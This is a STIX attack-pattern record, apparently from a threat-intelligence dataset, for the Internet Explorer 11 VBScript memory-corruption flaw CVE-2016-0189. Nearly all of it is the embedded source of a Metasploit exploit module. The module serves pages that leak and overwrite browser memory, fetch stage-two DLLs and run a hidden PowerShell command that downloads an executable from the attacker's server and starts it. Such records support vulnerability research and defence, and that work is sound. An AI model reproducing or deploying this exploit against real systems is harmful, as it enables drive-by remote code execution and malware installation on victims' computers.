{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a70f9675-e870-472e-9da8-c5d14a87d54d",
    "created": "2024-08-14T16:40:27.358657Z",
    "modified": "2024-08-14T16:40:27.358661Z",
    "name": "\"Internet Explorer 11 VBScript Engine Memory Corruption\"",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms16_051_vbscript.rb",
            "external_id": "ms16_051_vbscript.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-0189"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Internet Explorer 11 VBScript Engine Memory Corruption\",\n      'Description'    => %q{\n        This module exploits the memory corruption vulnerability (CVE-2016-0189)\n        present in the VBScript engine of Internet Explorer 11.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [\n          'Theori',                                              # Original RE research and exploitation\n          'William Webb <william_webb[at]rapid7.com>'            # Metasploit module\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [ 'Windows 10 with IE 11', { } ]\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2016-0189' ],\n          [ 'MSB', 'MS16-051' ]\n        ],\n      'Arch'           => ARCH_X64,\n      'DisclosureDate' => '2016-05-10',\n      'DefaultTarget'  => 0))\n  end\n\n  def setup\n    # @stage2html = Rex::Text.rand_text_alphanum(6)\n    @ieshell          = \"#{Rex::Text.rand_text_alphanumeric(6)}\"       # ieshell32.dll uri\n    @localsrv         = \"#{Rex::Text.rand_text_alphanumeric(6)}\"       # ielocalserver.dll uri\n    @pm_escape_html   = \"#{Rex::Text.rand_text_alphanumeric(6)}\"       # vbscipt_godmode.html\n    @payload_uri      = \"#{Rex::Text.rand_text_alphanumeric(8)}\"\n    @payload_exe      = \"#{Rex::Text.rand_text_alpha(6)}.exe\"\n    File.open(File.join( Msf::Config.data_directory, \"exploits\", \"cve-2016-0189\", \"ieshell32.dll\" ), \"rb\") { |f| @stage2dll = f.read }\n    File.open(File.join( Msf::Config.data_directory, \"exploits\", \"cve-2016-0189\", \"ielocalserver.dll\" ), \"rb\") { |f| @localserver = f.read }\n    super\n  end\n\n  def exploit_html(req_uri)\n    srvhost = datastore['SRVHOST']\n    srvport = datastore['SRVPORT']\n\n    template = <<-EOF\n    <html>\n    <head>\n    <meta http-equiv=\"x-ua-compatible\" content=\"IE=10\">\n    </head>\n    <body>\n\n        <script type=\"text/vbscript\">\n            Dim downloadFiles\n            Dim cacheRegex\n            Dim cacheFiles(3)\n\n            Dim downloadState\n            Dim pinTime\n\n            Dim oFSO\n            Dim oWS\n            Dim shell\n\n            function FindFile(path, regexFile)\n                FindFile = \"\"\n                For Each f in oFSO.GetFolder(path).Files\n                    If regexFile.Test(f.Name) Then\n                        FindFile = f.Name\n                        Exit For\n                    End If\n                Next\n            end function\n\n            function SearchCache(path, regexFile)\n                SearchCache = \"\"\n                For Each fld in oFSO.GetFolder(path).SubFolders\n                    'If DateDiff(\"s\", pinTime, fld.DateLastModified) >= 0 Then\n                        filename = FindFile(path & \"\\\\\" & fld.Name, regexFile)\n                        If filename <> \"\" Then\n                            SearchCache = path & \"\\\\\" & fld.Name & \"\\\\\" & filename\n                            Exit For\n                        End If\n                    'End If\n                Next\n            end function\n\n            function loaddll()\n                On Error Resume Next\n\n                Set wshSystemEnv = oWS.Environment(\"Process\")\n                tmpDir = oFSO.GetSpecialFolder(2)\n\n                tmpSysDir = tmpDir & \"\\\\System32\"\n                tmpShellFile = tmpSysDir & \"\\\\shell32.dll\"\n                oFSO.CreateFolder(tmpSysDir)\n                oFSO.MoveFile cacheFiles(0), tmpShellFile\n\n                mydllFile = tmpDir & \"\\\\\" & downloadFiles(1)\n                oFSO.MoveFile cacheFiles(1), mydllFile\n                wshSystemEnv(\"MyDllPath\") = mydllFile\n\n                If (UBound(downloadFiles) = 2) Then\n                    stage2File = tmpDir & \"\\\\#{@pm_escape_html}.html\"\n                    oFSO.MoveFile cacheFiles(2), stage2File\n                    wshSystemEnv(\"stage2file\") = stage2File\n                End If\n\n                saveRoot = wshSystemEnv(\"SystemRoot\")\n                wshSystemEnv(\"SaveSystemRoot\") = saveRoot\n                wshSystemEnv(\"SystemRoot\") = tmpDir\n                Set shell = CreateObject(\"Shell.Application\")\n\n                If (UBound(downloadFiles) = 2) Then\n                    call tolocal()\n                End If\n            end function\n\n            Sub OnDownloadDone()\n                If InStr(userAgent, \"NT 5.\") > 0 Then\n                    cacheDir = oWS.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n                    cacheDir = cacheDir & \"\\\\Local Settings\\\\Temporary Internet Files\\\\Low\\\\IE\"\n                Else\n                    cacheDir = oWS.ExpandEnvironmentStrings(\"%LOCALAPPDATA%\")\n                    cacheDir = cacheDir & \"\\\\Microsoft\\\\Windows\\\\Temporary Internet Files\\\\Low\\\\IE\"\n                End If\n\n                Set regexFile = new regexp\n                regexFile.Pattern = cacheRegex(downloadState)\n                cacheFiles(downloadState) = SearchCache(cacheDir, regexFile)\n                If cacheFiles(downloadState) = \"\" Then\n                    Exit Sub\n                End If\n\n                If downloadState = UBound(downloadFiles) Then\n                    loaddll()\n                Else\n                    downloadState = downloadState + 1\n                    DoDownload()\n                End If\n            End Sub\n\n            Sub DoDownload()\n                pinTime = Now\n                call getdll(downloadFiles(downloadState))\n            End Sub\n\n        Sub runshell()\n            downloadFiles = Array(\"#{@ieshell}.dll\", \"#{@localsrv}.dll\", \"#{@pm_escape_html}.html\")\n            cacheRegex = Array(\"^#{@ieshell}\\\\[\\\\d\\\\].dll$\", \"^#{@localsrv}\\\\[\\\\d\\\\].dll$\", \"^#{@pm_escape_html}\\\\[\\\\d\\\\].htm$\")\n            Set oFSO = CreateObject(\"Scripting.FileSystemObject\")\n            Set oWS = CreateObject(\"WScript.Shell\")\n            downloadState = 0\n            DoDownload()\n        End Sub\n\n        </script>\n\n        <script type=\"text/vbscript\">\n            Dim bl\n            Dim plunge(32)\n            Dim y(32)\n            prefix = \"%u4141%u4141\"\n            d = prefix & \"%u0016%u4141%u4141%u4141%u4242%u4242\"\n            b = String(64000, \"D\")\n            c = d & b\n            x = UnEscape(c)\n\n            Class ArrayWrapper\n                Dim A\n\n                Private Sub Class_Initialize\n                    ReDim Preserve AA(1, 2000)\n                    A = AA\n                End Sub\n\n                Public Sub Resize()\n                    ReDim Preserve A(1, 1)\n                End Sub\n            End Class\n\n            Class Spray\n            End Class\n\n\n            Function getAddr (arg1, s)\n          bl = Null\n          Set bl = New ArrayWrapper\n\n          For i = 0 To 32\n            Set plunge(i) = s\n          Next\n\n                Set bl.A(arg1, 2) = s\n\n          Dim addr\n                Dim i\n                For i = 0 To 31\n                    If Asc(Mid(y(i), 3, 1)) = VarType(s) Then\n                        addr = strToInt(Mid(y(i), 3 + 4, 2))\n                    End If\n            y(i) = Null\n                Next\n\n          If addr = Null Then\n            document.location.href = document.location.href\n            Return\n          End If\n\n          getAddr = addr\n        End Function\n\n        Function leakMem (arg1, addr)\n          d = prefix & \"%u0008%u4141%u4141%u4141\"\n                c = d & intToStr(addr) & b\n                x = UnEscape(c)\n\n          bl = Null\n                Set bl = New ArrayWrapper\n\n                Dim o\n                o = bl.A(arg1, 2)\n\n          leakMem = o\n        End Function\n\n        Sub overwrite (arg1, addr)\n          d = prefix & \"%u400C%u0000%u0000%u0000\"\n                c = d & intToStr(addr) & b\n                x = UnEscape(c)\n\n          bl = Null\n                Set bl = New ArrayWrapper\n                bl.A(arg1, 2) = CSng(0)\n        End Sub\n\n            Function exploit (arg1)\n                Dim addr\n                Dim csession\n                Dim olescript\n                Dim mem\n\n          Set sp = New Spray\n          addr = getAddr(arg1, sp)\n          mem = leakMem(arg1, addr + 8)\n          csession = strToInt(Mid(mem, 3, 2))\n          mem = leakMem(arg1, csession + 4)\n          olescript = strToInt(Mid(mem, 1, 2))\n          overwrite arg1, olescript + &H174\n          runshell()\n\n        End Function\n\n            Function triggerBug\n                bl.Resize()\n\n                Dim i\n                For i = 0 To 32\n                    y(i) = Mid(x, 1, 24000)\n                Next\n            End Function\n        </script>\n\n        <script type=\"text/javascript\">\n            var userAgent = navigator.userAgent;\n            var oReq;\n            function getdll(downloadFile)\n            {\n                oReq = new XMLHttpRequest();\n                oReq.open(\"GET\", \"http://#{srvhost}:#{srvport}#{req_uri}/\"+downloadFile, true);\n                oReq.onreadystatechange = handler;\n                oReq.send();\n            }\n            function handler()\n            {\n                if (oReq.readyState == 4 && oReq.status == 200) {\n                    OnDownloadDone();\n                }\n            }\n            function tolocal()\n            {\n                location.href = \"http://localhost:5555/#{@pm_escape_html}.html\";\n            }\n            function strToInt(s)\n            {\n                return s.charCodeAt(0) | (s.charCodeAt(1) << 16);\n            }\n            function intToStr(x)\n            {\n                return String.fromCharCode(x & 0xffff) + String.fromCharCode(x >> 16);\n            }\n            var o;\n            o = {\"valueOf\": function () {\n                    triggerBug();\n                    return 1;\n                }};\n            setTimeout(function() {exploit(o);}, 50);\n        </script>\n    </body>\n    </html>\n        EOF\n\n    template\n  end\n\n  def stage2_html(req_uri)\n\n    template = <<-EOF\n    <html>\n    <head>\n    <meta http-equiv=\"x-ua-compatible\" content=\"IE=10\">\n    </head>\n    <body>\n        <script type=\"text/vbscript\">\n            Dim aw\n            Dim plunge(32)\n            Dim y(32)\n            prefix = \"%u4141%u4141\"\n            d = prefix & \"%u0016%u4141%u4141%u4141%u4242%u4242\"\n            b = String(64000, \"D\")\n            c = d & b\n            x = UnEscape(c)\n\n            Class ArrayWrapper\n                Dim A()\n                Private Sub Class_Initialize\n                    ReDim Preserve A(1, 2000)\n                End Sub\n\n                Public Sub Resize()\n                    ReDim Preserve A(1, 1)\n                End Sub\n            End Class\n\n            Class Dummy\n            End Class\n\n            Function getAddr (arg1, s)\n                aw = Null\n                Set aw = New ArrayWrapper\n\n                For i = 0 To 32\n                    Set plunge(i) = s\n                Next\n\n                Set aw.A(arg1, 2) = s\n\n                Dim addr\n                Dim i\n                For i = 0 To 31\n                    If Asc(Mid(y(i), 3, 1)) = VarType(s) Then\n                        addr = strToInt(Mid(y(i), 3 + 4, 2))\n                    End If\n                    y(i) = Null\n                Next\n\n                If addr = Null Then\n                    document.location.href = document.location.href\n                    Return\n                End If\n\n                getAddr = addr\n            End Function\n\n            Function leakMem (arg1, addr)\n                d = prefix & \"%u0008%u4141%u4141%u4141\"\n                c = d & intToStr(addr) & b\n                x = UnEscape(c)\n\n                aw = Null\n                Set aw = New ArrayWrapper\n\n                Dim o\n                o = aw.A(arg1, 2)\n\n                leakMem = o\n            End Function\n\n            Sub overwrite (arg1, addr)\n                d = prefix & \"%u400C%u0000%u0000%u0000\"\n                c = d & intToStr(addr) & b\n                x = UnEscape(c)\n\n                aw = Null\n                Set aw = New ArrayWrapper\n                aw.A(arg1, 2) = CSng(0)\n            End Sub\n\n            Function exploit (arg1)\n                Dim addr\n                Dim csession\n                Dim olescript\n                Dim mem\n\n                Set dm = New Dummy\n                addr = getAddr(arg1, dm)\n                mem = leakMem(arg1, addr + 8)\n                csession = strToInt(Mid(mem, 3, 2))\n                mem = leakMem(arg1, csession + 4)\n                olescript = strToInt(Mid(mem, 1, 2))\n                overwrite arg1, olescript + &H174\n\n                Set shObj = CreateObject(\"Wscript.shell\")\n                shObj.Run(\"PowerShell -nologo -WindowStyle Hidden $d=$env:temp+'\\\\#{@payload_exe}';(New-Object System.Net.WebClient).DownloadFile('http://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}#{req_uri}/#{@payload_uri}',$d);Start-Process $d\")\n                shObj.Run(\"%temp%\\\\#{@payload_exe}\")\n\n            End Function\n\n            Function triggerBug\n                aw.Resize()\n\n                Dim i\n                For i = 0 To 32\n                    y(i) = Mid(x, 1, 24000)\n                Next\n            End Function\n        </script>\n\n        <script type=\"text/javascript\">\n            function strToInt(s)\n            {\n                return s.charCodeAt(0) | (s.charCodeAt(1) << 16);\n            }\n            function intToStr(x)\n            {\n                return String.fromCharCode(x & 0xffff) + String.fromCharCode(x >> 16);\n            }\n            var o;\n            o = {\"valueOf\": function () {\n                    triggerBug();\n                    return 1;\n                }};\n            setTimeout(function() {exploit(o);}, 50);\n        </script>\n    </body>\n    </html>\n\n      EOF\n      template\n  end\n\n  def on_request_uri(cli, request)\n    # used for some debugging stuff\n    ies = @ieshell\n    ls  = @localsrv\n    pm  = @pm_escape_html\n\n    print_status(\"Received request: #{request.uri}\")\n      if request.uri =~ /.*#{ies}.*$/\n        print_status(\"Sending stage two DLL ...\")\n        send_response(cli, @stage2dll, { 'Content-Type' => 'application/x-msdownload', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache', 'Connection' => 'close' })\n      elsif request.uri =~ /.*#{ls}.*$/\n        print_status(\"Sending local server DLL ...\")\n        send_response(cli, @localserver, { 'Content-Type' => 'application/x-msdownload', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache', 'Connection' => 'close' })\n      elsif request.uri =~ /.*#{pm}.*$/\n        rq = \"#{get_resource.chomp('/')}\"\n        gm = stage2_html(rq)\n        send_response(cli, gm, { 'Content-Type' => 'text/html', 'Pragma' => 'no-cache', 'Cache-Control' => 'no-cache', 'Connection' => 'close' })\n      elsif request.uri =~ /.*#{@payload_uri}$/\n        return if ((payload = regenerate_payload(cli)) == nil)\n        print_status(\"Sending payload ...\")\n        send_response(cli, generate_payload_exe({ :code => payload.encoded }), { 'Content-Type' => 'application/octet-stream', 'Connection' => 'close' })\n      else\n        print_status(\"Sending main page ..\")\n        send_response(cli, exploit_html(request.uri))\n      end\n  end\nend\n\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2016-05-10",
    "x_mitre_platforms": [
        "win'"
    ]
}